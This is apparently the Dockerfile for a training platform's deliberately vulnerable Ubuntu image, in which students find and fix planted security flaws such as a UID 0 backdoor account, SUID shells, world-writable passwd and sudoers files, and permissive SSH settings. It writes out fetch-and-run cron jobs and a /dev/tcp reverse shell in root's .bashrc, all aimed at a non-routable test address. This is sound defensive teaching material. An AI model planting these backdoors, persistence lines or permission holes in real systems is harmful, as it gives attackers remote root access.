# RoundZero — linux-practice vulnerable image.
#
# Every injected vuln/decoy below is documented in answer-key.yaml and
# scored by ../checks/linux-practice.yaml — the two files and this
# Dockerfile must always describe the exact same planted states. See
# agent/README.md "How to add a vuln" before changing any of this.
#
# No accounts here are given passwords: nothing in the check file exercises
# login, and baking in plaintext creds is exactly the bad habit this
# platform teaches teams to avoid.

FROM ubuntu:24.04

ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && apt-get install -y --no-install-recommends \
        openssh-server \
        sudo \
        cron \
        ufw \
        libpam-pwquality \
        telnetd \
        vsftpd \
        rpcbind \
        iproute2 \
        findutils \
        procps \
    && ssh-keygen -A \
    && rm -rf /var/lib/apt/lists/*

# Normally created at boot by systemd-tmpfiles from openssh-server's
# tmpfiles.d entry; nothing boots in this container, so `sshd -T` fails
# with "Missing privilege separation directory" without this.
RUN mkdir -p /run/sshd && chmod 0755 /run/sshd

# --- uid0-backdoor: unauthorized UID 0 account ------------------------------
RUN useradd -o -u 0 -g 0 -M -N -s /bin/bash backdoor

# --- unauthorized-sudo: unauthorized member of the sudo group ---------------
RUN useradd -m -s /bin/bash mallory \
    && usermod -aG sudo mallory

# --- decoy-authorized-user: legitimately-authorized odd-named user ----------
# Also in sudo — proves unauthorized-sudo's check keys on "mallory"
# specifically rather than blanket-flagging every unfamiliar sudoer.
RUN useradd -m -u 1002 -s /bin/bash zzsync \
    && usermod -aG sudo zzsync

# --- pwquality-minlen: pam_pwquality installed but not enforcing minlen -----
RUN printf '# RoundZero linux-practice: intentionally unconfigured.\n# minlen = 8\n# dcredit = -1\n' \
    > /etc/security/pwquality.conf

# --- faillock-deny: no lockout threshold configured -------------------------
RUN printf '# RoundZero linux-practice: intentionally unconfigured.\n# deny = 3\n# unlock_time = 600\n' \
    > /etc/security/faillock.conf

# --- ssh-permitrootlogin: root login allowed, AND overridden by a ----------
# cloud-init-style drop-in that wins regardless of the main file (Ubuntu's
# stock sshd_config Includes sshd_config.d/*.conf before its own
# directives, so whichever file sets a keyword first wins). This is the
# real Ubuntu 24.04 cloud-image trap the linux-core checklist calls out.
RUN sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config \
    && printf '# Mirrors the Ubuntu cloud-image 50-cloud-init.conf drop-in.\nPermitRootLogin yes\n' \
    > /etc/ssh/sshd_config.d/50-cloud-init.conf

# --- cron-malicious: reverse-shell-style cron persistence -------------------
# 198.51.100.0/24 is TEST-NET-2 (RFC 5737): guaranteed non-routable, so this
# is inert — it exists only as a pattern for the check/a student to find.
RUN printf '*/5 * * * * root curl -s http://198.51.100.23/x.sh | bash\n' \
    > /etc/cron.d/pkg-update \
    && chmod 644 /etc/cron.d/pkg-update

# --- insecure-service-absent: prohibited telnetd package installed ---------
# (installed via the apt-get above; nothing further to inject)

# --- shadow-mode: world-readable /etc/shadow --------------------------------
RUN chmod 644 /etc/shadow

# --- rogue-suid: attacker-planted SUID binary -------------------------------
RUN cp /bin/bash /usr/local/bin/rootbash \
    && chmod 4755 /usr/local/bin/rootbash

# --- ufw-active: firewall left disabled -------------------------------------
# (ufw's default post-install state is inactive; nothing further to inject)

# --- decoy-required-ssh: ssh stays enabled by openssh-server's own postinst -
# (nothing further to inject)

# =============================================================================
# Vuln expansion (10 -> 30): see ../VULN_EXPANSION_SPEC.md for the design doc.
# =============================================================================

# --- svc-backup-account: unauthorized, service-account-looking user with an
# interactive shell (not UID 0, not sudo — distinct from backdoor/mallory) ---
RUN useradd -o -u 1003 -s /bin/bash -M svc-backup

# --- sudo-nopasswd: the *authorized* user zzsync granted passwordless root via
# a sudoers drop-in — the account is allowed, the NOPASSWD is the vuln ---
RUN printf 'zzsync ALL=(ALL) NOPASSWD:ALL\n' > /etc/sudoers.d/99-devops \
    && chmod 0440 /etc/sudoers.d/99-devops

# --- empty-password: authorized user zzsync given a blank /etc/shadow password
# field (anyone can log in with no password) ---
RUN passwd -d zzsync

# --- chage-maxdays: passwords never expire (Ubuntu's stock default, made
# explicit here so the vuln is deterministic regardless of base-image drift) --
RUN sed -i 's/^PASS_MAX_DAYS.*/PASS_MAX_DAYS\t99999/' /etc/login.defs

# --- pwhistory-remember: no password-reuse prevention configured (mirrors the
# pwquality.conf pattern above: shipped, but every directive commented) ------
RUN printf '# RoundZero linux-practice: intentionally unconfigured.\n# remember = 5\n' \
    > /etc/security/pwhistory.conf

# --- ssh-maxauthtries / ssh-x11forwarding: high auth-attempt limit and X11
# forwarding left enabled via a NEW drop-in that wins over the main file (same
# Include-order trap as ssh-permitrootlogin above) — editing only the main
# sshd_config does nothing; the drop-in must be fixed. ------------------------
RUN printf '# Mirrors an over-permissive devops drop-in.\nMaxAuthTries 6\nX11Forwarding yes\n' \
    > /etc/ssh/sshd_config.d/60-devops-limits.conf

# --- cron-user-payload: reverse-shell-style job in the authorized user's own
# crontab (distinct location from the existing /etc/cron.d job) — inert,
# TEST-NET-2 (RFC 5737) target, same convention as cron-malicious above ------
RUN printf '*/10 * * * * wget -qO- http://198.51.100.23/m | sh\n' \
    > /var/spool/cron/crontabs/zzsync \
    && chmod 0600 /var/spool/cron/crontabs/zzsync \
    && chown zzsync:crontab /var/spool/cron/crontabs/zzsync

# --- bashrc-payload: reverse-shell line planted in root's shell rc ----------
RUN printf '\n# sync\nbash -i >& /dev/tcp/198.51.100.23/4444 0>&1\n' >> /root/.bashrc

# --- rogue-authorized-key: a key that would survive a password change -------
RUN mkdir -p /root/.ssh && chmod 700 /root/.ssh \
    && printf 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINotARealKeyRoundZeroPractice rogue@attacker\n' \
    > /root/.ssh/authorized_keys \
    && chmod 600 /root/.ssh/authorized_keys

# --- insecure-service-vsftpd: prohibited FTP service installed -------------
# (installed via the apt-get above; nothing further to inject)

# --- rpcbind-disabled: unneeded RPC service left enabled --------------------
# (installed+enabled via the apt-get above; nothing further to inject)

# --- passwd-writable: world-writable /etc/passwd (trivial account injection)
RUN chmod 666 /etc/passwd

# --- sudoers-mode: /etc/sudoers permissions loosened from 440 --------------
RUN chmod 777 /etc/sudoers

# --- world-writable-dir: a shared dir with no sticky bit --------------------
RUN mkdir -p /opt/shared && chmod 0777 /opt/shared

# --- second-suid: a second attacker-planted SUID binary (proves the SUID
# check handles multiple planted binaries, alongside rogue-suid above) ------
RUN cp /usr/bin/find /usr/local/bin/qfind \
    && chmod 4755 /usr/local/bin/qfind

# --- sysctl-ip-forward / sysctl-rp-filter / sysctl-accept-redirects: no
# sysctl hardening file written. Per the wiring caveat, these grade the FILE,
# never live `sysctl` (Docker owns net.* on the host) — so the absence of
# /etc/sysctl.d/99-roundzero.conf is itself the planted vuln; nothing to
# inject beyond leaving it unwritten. --------------------------------------

# --- decoy-required-cron: a LEGITIMATE, README-required cron job — do not
# remove it. Zero points; failing it teaches "don't over-zealously clean
# cron," mirroring the authorization-model lesson of the two decoys above. --
RUN printf '#!/bin/bash\necho "backup placeholder"\n' > /usr/local/bin/backup.sh \
    && chmod 0755 /usr/local/bin/backup.sh \
    && printf '0 2 * * * root /usr/local/bin/backup.sh\n' > /etc/cron.d/backup \
    && chmod 644 /etc/cron.d/backup

COPY fixes/ /opt/fixes/
RUN chmod +x /opt/fixes/*.sh

CMD ["sleep", "infinity"]
